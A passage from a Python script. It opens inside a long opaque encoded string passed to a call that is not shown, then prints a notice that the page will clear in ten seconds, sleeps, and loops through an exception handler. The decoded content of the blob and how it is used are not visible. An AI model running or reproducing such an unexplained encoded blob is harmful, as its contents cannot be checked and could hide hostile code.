QEK9XQwfwvpW8Rwu+ljxTdQ7YA79j0fonHbxtYQjF0DVNdP7vLwUurCVS+c3g00TYUVhb7xy9jZJqCUEa2onOzhSZWHp9fIAUUbn25/rhChOfALg1CUTVSEny9nd09aswVicoGBAnZHbZ/Ej5Lqt8dXrDgfFGJ6YKieWgvaw0rQLxpUJLoNmu26EwvnhKK5UddodUGyJLXOtPEl5Cj/MxmQ0u3VNtCkJJHcHudxT28miLHpKZtYLD3ZHri/q12D2Yl6dcR3eyhU7OkubQxfR8Ro23ydm51/Kd7XZKSJg1aC9lQ3f9aNBE34+YVDkEu2Cz+6zq0sdXLgSHC9tu6dXJWoEX0DeEdMMlRMxr988WoRnR5VvC6S0i4ECiXZXR8XilOb1PTeHLtFhEVtDSq6ze6wkD9EsJIPLVHohgwuIoN3nzqN5jEREJCz7CXQ6ijvBfQgoO0PzqgD2WkkbgHV+35t5sf121vch+G2A8gcW81cDDoS37ztk1FfhXkOfdSV0mXUmedow/0RpMz0hdjOUXWR7zqmUOKnNdpFIKcUZNyuxfC4R1AE7LtsjClXmxN4e6eC/lO2DzwdCezVQ+oCPnIXIsKk6Pk7pIOGwVdQy48/QxFlWjAoFwibwvdmX1D2vk1BhaIwhgbb5sGR8P/4nuBQuIIaeT+wV6JrodXfRHzkakYUHfeOUWlQTw5wSil1XTDdIVzllCZokPL9ZJsp/MMtto4dd7cQy+QlqXkUHT0AlPLdh96BK/eMB8t8tUGJq5QSIeCx/RIYRIYdzn0WQf6t+HBcK7LG851zLSR/p0AIlPWRRsQROVKdLA+WYxrezS2pi5HIJm+RIY6UkcRYLyprLZ6pwLR+PmKOY669AX27o8DQnLjBjqkdf47YwEIRwBI5PdTfl/98+n0v//fe+/z8pK7yn7uqFepihnkf/c5u7UQOk4fHcJII3C4i9n9Ch2qmhSXbmVwJe'))

            
            print(f" \n {yellow}In 10 seconds، the page will be cleared.")

            S(10)
            




    # comment: 
    except Exception as e:
        print(e)
        input()
        continue
    # end try













































